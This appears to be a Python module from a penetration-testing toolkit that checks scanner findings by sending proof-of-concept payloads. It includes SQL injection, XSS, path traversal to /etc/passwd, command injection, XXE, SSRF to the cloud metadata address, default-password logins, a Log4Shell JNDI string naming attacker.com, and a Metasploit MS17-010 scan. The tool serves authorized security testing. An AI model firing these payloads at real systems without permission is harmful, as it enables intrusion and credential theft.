#!/usr/bin/env python3
"""

Version: 3.0 - Updated for dynamic path detection
Exploit Validation Module
Safely validates vulnerabilities with non-destructive proof-of-concept testing

This module attempts to verify discovered vulnerabilities are actually exploitable
using controlled, non-destructive techniques that prove exploitability without
causing damage or service disruption.
"""

import json
import yaml
import logging
import requests
import subprocess
import socket
import ssl
import time
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional
import re
import base64

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Add parent directory to path for imports
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

# Import path helper for dynamic paths
from utils.path_helper import BASE_DIR, CONFIG_FILE, RESULTS_DIR, LOGS_DIR
# Specific results directory
EXPLOIT_VALIDATION_DIR = RESULTS_DIR / 'exploit-validation'

# Paths

VALIDATION_DIR = BASE_DIR / 'exploit-validation'
DB_FILE = VALIDATION_DIR / 'validation.db'

# Safe PoC patterns
SAFE_POC_TESTS = {
    'sql_injection': {
        'name': 'SQL Injection',
        'safe_payloads': [
            "' OR '1'='1",  # Simple boolean test
            "admin' --",    # Comment injection
            "' UNION SELECT NULL--",  # Union test
        ],
        'success_indicators': [
            'syntax error', 'sql', 'mysql', 'postgresql', 'oracle',
            'unexpected', 'query failed'
        ],
        'risk_level': 'safe'  # Read-only, no data modification
    },
    
    'xss': {
        'name': 'Cross-Site Scripting',
        'safe_payloads': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
        ],
        'success_indicators': [
            '<script>', 'onerror', 'javascript:',
            'alert(', 'XSS'
        ],
        'risk_level': 'safe'  # No actual code execution on server
    },
    
    'directory_traversal': {
        'name': 'Directory Traversal',
        'safe_payloads': [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        ],
        'success_indicators': [
            'root:x:', '[extensions]', 'bin/bash',
            'for 16-bit app support'
        ],
        'risk_level': 'safe'  # Read-only, well-known files
    },
    
    'command_injection': {
        'name': 'Command Injection',
        'safe_payloads': [
            '; echo "VULNERABLE" ;',
            '| echo "VULNERABLE"',
            '`echo "VULNERABLE"`',
            '$(echo "VULNERABLE")',
        ],
        'success_indicators': [
            'VULNERABLE', 'command not found'
        ],
        'risk_level': 'moderate'  # Echo is safe, but proves RCE
    },
    
    'xxe': {
        'name': 'XML External Entity',
        'safe_payloads': [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        ],
        'success_indicators': [
            'root:x:', 'DOCTYPE'
        ],
        'risk_level': 'safe'  # Read-only
    },
    
    'ssrf': {
        'name': 'Server-Side Request Forgery',
        'safe_payloads': [
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://localhost:80',
            'http://127.0.0.1:22',
        ],
        'success_indicators': [
            'ami-id', 'connection refused', 'SSH'
        ],
        'risk_level': 'safe'  # Read-only requests
    },
    
    'weak_authentication': {
        'name': 'Weak Authentication',
        'safe_payloads': [
            {'username': 'admin', 'password': 'admin'},
            {'username': 'admin', 'password': 'password'},
            {'username': 'administrator', 'password': 'administrator'},
            {'username': 'root', 'password': 'root'},
        ],
        'success_indicators': [
            'welcome', 'dashboard', 'logout', 'authenticated'
        ],
        'risk_level': 'safe'  # Only attempts common credentials
    },
}

# CVE-specific PoC tests
CVE_SPECIFIC_TESTS = {
    'CVE-2021-44228': {  # Log4Shell
        'name': 'Log4Shell (Apache Log4j RCE)',
        'test_method': 'log4shell_detection',
        'safe_payload': '${jndi:ldap://attacker.com/a}',  # Just detection, no callback
        'success_indicators': ['jndi', 'ldap'],
        'risk_level': 'safe'
    },
    
    'CVE-2017-0144': {  # EternalBlue
        'name': 'EternalBlue (MS17-010)',
        'test_method': 'check_smb_version',
        'safe_payload': None,  # Metasploit auxiliary/scanner/smb/smb_ms17_010
        'success_indicators': ['vulnerable', 'MS17-010'],
        'risk_level': 'safe'
    },
    
    'CVE-2014-0160': {  # Heartbleed
        'name': 'Heartbleed (OpenSSL)',
        'test_method': 'heartbleed_test',
        'safe_payload': None,  # Memory leak test
        'success_indicators': ['memory leak', 'heartbeat'],
        'risk_level': 'safe'
    },
}

class ExploitValidator:
    """Safely validate vulnerabilities with non-destructive PoC testing"""
    
    def __init__(self):
        self.config = self.load_config()
        self.validation_results = []
        VALIDATION_DIR.mkdir(parents=True, exist_ok=True)
        
        # Safety limits
        self.max_requests_per_host = 50  # Prevent DoS
        self.request_delay = 2  # Seconds between requests
        self.timeout = 10  # Request timeout
        
    def load_config(self):
        """Load configuration"""
        try:
            with open(CONFIG_FILE, 'r') as f:
                return yaml.safe_load(f)
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
            return {}
    
    def validate_vulnerability(self, finding: Dict, auto_validate: bool = False) -> Dict:
        """
        Validate a vulnerability finding with safe PoC testing
        
        Args:
            finding: Vulnerability finding from scanner
            auto_validate: If False, require explicit approval
        
        Returns:
            Validation result dictionary
        """
        
        validation = {
            'finding_id': finding.get('title', 'Unknown')[:50],
            'host': finding.get('host', 'Unknown'),
            'vulnerability_type': self._categorize_vulnerability(finding),
            'timestamp': datetime.now().isoformat(),
            'validated': False,
            'validation_method': None,
            'proof_of_concept': None,
            'evidence': [],
            'risk_level': 'unknown',
            'recommendation': ''
        }
        
        # Safety check - don't auto-validate on production (by default)
        if not auto_validate and not self._get_manual_approval(finding):
            validation['status'] = 'skipped'
            validation['note'] = 'Manual approval required'
            return validation
        
        vuln_type = validation['vulnerability_type']
        
        # Attempt validation based on vulnerability type
        if vuln_type in SAFE_POC_TESTS:
            validation.update(self._test_generic_vulnerability(finding, vuln_type))
        
        # Check for specific CVE tests
        cve_id = self._extract_cve(finding)
        if cve_id and cve_id in CVE_SPECIFIC_TESTS:
            validation.update(self._test_specific_cve(finding, cve_id))
        
        # Save result
        self.validation_results.append(validation)
        self._save_validation_result(validation)
        
        return validation
    
    def _categorize_vulnerability(self, finding: Dict) -> str:
        """Categorize vulnerability type from finding"""
        
        title = finding.get('title', '').lower()
        description = finding.get('description', '').lower()
        combined = title + ' ' + description
        
        # Pattern matching
        if 'sql' in combined or 'injection' in combined:
            return 'sql_injection'
        elif 'xss' in combined or 'cross-site' in combined:
            return 'xss'
        elif 'directory traversal' in combined or 'path traversal' in combined:
            return 'directory_traversal'
        elif 'command injection' in combined or 'rce' in combined:
            return 'command_injection'
        elif 'xxe' in combined or 'xml external' in combined:
            return 'xxe'
        elif 'ssrf' in combined or 'server-side request' in combined:
            return 'ssrf'
        elif 'weak' in combined and ('password' in combined or 'credential' in combined):
            return 'weak_authentication'
        else:
            return 'unknown'
    
    def _extract_cve(self, finding: Dict) -> Optional[str]:
        """Extract CVE ID from finding"""
        
        text = finding.get('title', '') + ' ' + finding.get('description', '')
        cve_pattern = r'CVE-\d{4}-\d{4,}'
        
        match = re.search(cve_pattern, text, re.IGNORECASE)
        if match:
            return match.group(0).upper()
        
        return None
    
    def _get_manual_approval(self, finding: Dict) -> bool:
        """Request manual approval for validation"""
        
        logger.warning(f"\n{'='*70}")
        logger.warning("EXPLOIT VALIDATION APPROVAL REQUIRED")
        logger.warning(f"{'='*70}")
        logger.warning(f"Finding: {finding.get('title', 'Unknown')}")
        logger.warning(f"Host: {finding.get('host', 'Unknown')}")
        logger.warning(f"Severity: {finding.get('severity', 'Unknown')}")
        logger.warning(f"\nThis will attempt SAFE, NON-DESTRUCTIVE validation.")
        logger.warning("No data will be modified or services disrupted.")
        logger.warning(f"{'='*70}")
        
        response = input("Proceed with validation? [y/N]: ")
        return response.lower() == 'y'
    
    def _test_generic_vulnerability(self, finding: Dict, vuln_type: str) -> Dict:
        """Test generic vulnerability type with safe payloads"""
        
        test_config = SAFE_POC_TESTS[vuln_type]
        logger.info(f"Testing {test_config['name']} on {finding.get('host')}")
        
        result = {
            'validation_method': f"safe_poc_{vuln_type}",
            'risk_level': test_config['risk_level'],
            'evidence': []
        }
        
        # Extract URL from finding
        url = self._extract_url(finding)
        if not url:
            result['validated'] = False
            result['note'] = 'No URL found to test'
            return result
        
        # Test each payload
        for payload in test_config['safe_payloads']:
            try:
                logger.info(f"  Testing payload: {payload[:50]}...")
                
                # Construct test request
                if vuln_type == 'weak_authentication':
                    response = self._test_weak_auth(url, payload)
                else:
                    response = self._test_injection(url, payload)
                
                # Check for success indicators
                if response and self._check_success_indicators(
                    response, test_config['success_indicators']
                ):
                    result['validated'] = True
                    result['proof_of_concept'] = payload
                    result['evidence'].append({
                        'payload': payload,
                        'response_snippet': response[:500],
                        'matched_indicators': self._find_matched_indicators(
                            response, test_config['success_indicators']
                        )
                    })
                    logger.info("  âœ“ Vulnerability VALIDATED")
                    break
                
                # Rate limiting
                time.sleep(self.request_delay)
                
            except Exception as e:
                logger.error(f"  Error testing payload: {e}")
                continue
        
        if not result.get('validated'):
            result['validated'] = False
            result['note'] = 'Could not validate vulnerability with safe payloads'
            logger.info("  âœ— Vulnerability not validated (may be false positive)")
        
        return result
    
    def _test_specific_cve(self, finding: Dict, cve_id: str) -> Dict:
        """Test specific CVE with targeted PoC"""
        
        test_config = CVE_SPECIFIC_TESTS[cve_id]
        logger.info(f"Testing {test_config['name']} ({cve_id})")
        
        result = {
            'validation_method': test_config['test_method'],
            'risk_level': test_config['risk_level'],
            'cve_id': cve_id,
            'evidence': []
        }
        
        # Call specific test method
        test_method = getattr(self, test_config['test_method'], None)
        if test_method:
            try:
                validation_result = test_method(finding, test_config)
                result.update(validation_result)
            except Exception as e:
                logger.error(f"Error testing {cve_id}: {e}")
                result['validated'] = False
                result['note'] = f"Test failed: {str(e)}"
        else:
            result['validated'] = False
            result['note'] = f"Test method {test_config['test_method']} not implemented"
        
        return result
    
    def _test_injection(self, url: str, payload: str) -> Optional[str]:
        """Test injection vulnerability"""
        
        try:
            # Try multiple injection points
            test_urls = [
                f"{url}?id={payload}",  # Query parameter
                f"{url}/{payload}",     # Path
            ]
            
            for test_url in test_urls:
                response = requests.get(
                    test_url,
                    timeout=self.timeout,
                    verify=False,  # Some internal sites have self-signed certs
                    allow_redirects=False
                )
                
                if response.text:
                    return response.text
            
        except Exception as e:
            logger.debug(f"Injection test error: {e}")
        
        return None
    
    def _test_weak_auth(self, url: str, credentials: Dict) -> Optional[str]:
        """Test weak authentication"""
        
        try:
            # Common login endpoints
            login_endpoints = [
                '/login', '/admin/login', '/wp-login.php',
                '/administrator', '/admin'
            ]
            
            for endpoint in login_endpoints:
                login_url = url.rstrip('/') + endpoint
                
                try:
                    response = requests.post(
                        login_url,
                        data=credentials,
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=False
                    )
                    
                    # Check if login successful
                    if response.status_code in [200, 302]:
                        return response.text + str(response.headers)
                    
                except:
                    continue
        
        except Exception as e:
            logger.debug(f"Weak auth test error: {e}")
        
        return None
    
    def _check_success_indicators(self, response: str, indicators: List[str]) -> bool:
        """Check if response contains success indicators"""
        
        response_lower = response.lower()
        return any(indicator.lower() in response_lower for indicator in indicators)
    
    def _find_matched_indicators(self, response: str, indicators: List[str]) -> List[str]:
        """Find which indicators matched"""
        
        response_lower = response.lower()
        return [ind for ind in indicators if ind.lower() in response_lower]
    
    def _extract_url(self, finding: Dict) -> Optional[str]:
        """Extract URL from finding"""
        
        # Check various fields
        url = finding.get('url') or finding.get('matched_at') or finding.get('host')
        
        if url:
            # Ensure it has a scheme
            if not url.startswith('http'):
                url = f"http://{url}"
            return url
        
        return None
    
    # Specific CVE test methods
    
    def log4shell_detection(self, finding: Dict, config: Dict) -> Dict:
        """Detect Log4Shell vulnerability (CVE-2021-44228)"""
        
        result = {'validated': False, 'evidence': []}
        
        url = self._extract_url(finding)
        if not url:
            result['note'] = 'No URL to test'
            return result
        
        # Safe detection - just check if JNDI lookup is attempted
        # DO NOT use actual callback server
        safe_payload = '${jndi:ldap://127.0.0.1/safe-test}'
        
        try:
            # Try in headers and parameters
            headers = {
                'User-Agent': safe_payload,
                'X-Api-Version': safe_payload
            }
            
            response = requests.get(
                url,
                headers=headers,
                params={'test': safe_payload},
                timeout=self.timeout,
                verify=False
            )
            
            # Check server logs or errors for JNDI attempts
            # This is passive detection
            result['validated'] = False  # Can't confirm without callback
            result['note'] = 'Payload injected; requires callback server for confirmation'
            result['evidence'].append({
                'payload': safe_payload,
                'note': 'Safe test payload injected'
            })
            
        except Exception as e:
            result['note'] = f"Test error: {e}"
        
        return result
    
    def check_smb_version(self, finding: Dict, config: Dict) -> Dict:
        """Check for MS17-010 (EternalBlue) vulnerability"""
        
        result = {'validated': False, 'evidence': []}
        
        host = finding.get('host')
        if not host:
            result['note'] = 'No host specified'
            return result
        
        try:
            # Use Metasploit's auxiliary scanner (safe, no exploitation)
            cmd = [
                'msfconsole', '-q', '-x',
                f'use auxiliary/scanner/smb/smb_ms17_010; '
                f'set RHOSTS {host}; '
                f'run; exit'
            ]
            
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            output = proc.stdout + proc.stderr
            
            if 'vulnerable' in output.lower():
                result['validated'] = True
                result['evidence'].append({
                    'scanner': 'Metasploit smb_ms17_010',
                    'output_snippet': output[:500]
                })
            else:
                result['note'] = 'Not vulnerable or check failed'
            
        except Exception as e:
            result['note'] = f"Test error: {e}"
        
        return result
    
    def heartbleed_test(self, finding: Dict, config: Dict) -> Dict:
        """Test for Heartbleed vulnerability (CVE-2014-0160)"""
        
        result = {'validated': False, 'evidence': []}
        
        host = finding.get('host')
        if not host:
            result['note'] = 'No host specified'
            return result
        
        try:
            # Use ssltest.py or custom heartbeat test
            # This is a safe read-only test
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            with socket.create_connection((host, 443), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=host) as ssock:
                    # Get SSL version
                    ssl_version = ssock.version()
                    
                    # Heartbleed affects OpenSSL 1.0.1 through 1.0.1f
                    # This is just version check, not actual exploit
                    result['evidence'].append({
                        'ssl_version': ssl_version,
                        'note': 'Version check only, actual heartbeat test requires specialized tool'
                    })
                    
                    result['note'] = 'Use specialized heartbleed checker for confirmation'
        
        except Exception as e:
            result['note'] = f"Test error: {e}"
        
        return result
    
    def _save_validation_result(self, result: Dict):
        """Save validation result to file"""
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"validation_{result['host'].replace('.', '_')}_{timestamp}.json"
        filepath = VALIDATION_DIR / filename
        
        with open(filepath, 'w') as f:
            json.dump(result, f, indent=2)
        
        logger.info(f"Validation result saved: {filepath}")
    
    def generate_validation_report(self, output_file: Path = None) -> str:
        """Generate HTML report of validation results"""
        
        if not output_file:
            output_file = VALIDATION_DIR / f'validation_report_{datetime.now().strftime("%Y%m%d")}.html'
        
        html = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Exploit Validation Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        h1 {{ color: #333; border-bottom: 3px solid #667eea; }}
        .validated {{ background-color: #ffebee; border-left: 4px solid #f44336; padding: 15px; margin: 15px 0; }}
        .not-validated {{ background-color: #e8f5e9; border-left: 4px solid #4caf50; padding: 15px; margin: 15px 0; }}
        .evidence {{ background-color: #f5f5f5; padding: 10px; margin: 10px 0; font-family: monospace; }}
        .safe {{ color: #4caf50; }}
        .moderate {{ color: #ff9800; }}
    </style>
</head>
<body>
    <h1>Exploit Validation Report</h1>
    <p><strong>Generated:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    <p><strong>Total Validations:</strong> {len(self.validation_results)}</p>
    
    <h2>Validation Results</h2>
'''
        
        for result in self.validation_results:
            div_class = 'validated' if result.get('validated') else 'not-validated'
            status = 'âœ“ VALIDATED' if result.get('validated') else 'âœ— NOT VALIDATED'
            
            html += f'''
    <div class="{div_class}">
        <h3>{status}: {result['finding_id']}</h3>
        <p><strong>Host:</strong> {result['host']}</p>
        <p><strong>Type:</strong> {result['vulnerability_type']}</p>
        <p><strong>Risk Level:</strong> <span class="{result['risk_level']}">{result['risk_level'].upper()}</span></p>
        <p><strong>Method:</strong> {result.get('validation_method', 'N/A')}</p>
'''
            
            if result.get('proof_of_concept'):
                html += f'''
        <p><strong>Proof of Concept:</strong></p>
        <div class="evidence">{result['proof_of_concept']}</div>
'''
            
            if result.get('evidence'):
                html += '<p><strong>Evidence:</strong></p>'
                for evidence in result['evidence']:
                    html += f'<div class="evidence">{json.dumps(evidence, indent=2)}</div>'
            
            html += '</div>'
        
        html += '''
</body>
</html>
'''
        
        with open(output_file, 'w') as f:
            f.write(html)
        
        logger.info(f"Validation report generated: {output_file}")
        return str(output_file)

def main():
    """Main entry point"""
    
    # Example usage
    validator = ExploitValidator()
    
    # Example finding
    finding = {
        'title': 'Potential SQL Injection',
        'host': '10.0.1.100',
        'url': 'http://10.0.1.100/login.php',
        'severity': 'high',
        'description': 'Possible SQL injection vulnerability detected'
    }
    
    # Validate (will ask for approval)
    result = validator.validate_vulnerability(finding, auto_validate=False)
    
    # Generate report
    validator.generate_validation_report()

if __name__ == '__main__':
    main()
